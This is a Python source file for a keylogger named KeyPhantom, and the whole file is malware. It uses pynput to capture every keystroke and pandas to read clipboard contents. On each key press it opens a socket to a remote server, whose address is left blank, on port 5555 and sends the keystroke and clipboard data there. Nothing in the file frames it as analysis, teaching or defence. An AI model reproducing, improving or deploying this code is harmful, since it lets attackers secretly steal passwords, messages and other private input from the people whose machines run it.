#!/usr/bin/python3

import os
import socket
import threading
from pynput import keyboard
import pandas as pd

SERVER_ADDRESS = '___________:5555'

class KeyPhantom:
    def __init__(self):
        # Create the logs directory if it doesn't exist
        if not os.path.exists("logs"):
            os.makedirs("logs")

        self.log_file = f"logs/keyphantom_{socket.gethostname()}.txt"

    def on_press(self, key):
        try:
            # Connect to the server and send the keystroke or clipboard data
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((SERVER_ADDRESS.split(':')[0], int(SERVER_ADDRESS.split(':')[-1])))

                # Send clipboard data
                try:
                    data = self.get_clipboard_data()
                    s.send(f"Clipboard data: {data}\n".encode())
                except:
                    s.send("Failed to fetch clipboard data\n".encode())

                # Send keystroke
                s.send(f"Keystroke: {key}\n".encode())

        except Exception as e:
            print(f"Error: {e}")

    def start_keyphantom(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    @staticmethod
    def get_clipboard_data():
        try:
            data = str(pd.read_clipboard().columns)
            data = data.lstrip('Index([').split("], dtype='object'")[0]
            return data
        except:
            return None

if __name__ == "__main__":
    try:
        obj = KeyPhantom()
        thread = threading.Thread(target=obj.start_keyphantom)
        thread.start()
    except KeyboardInterrupt:
        pass

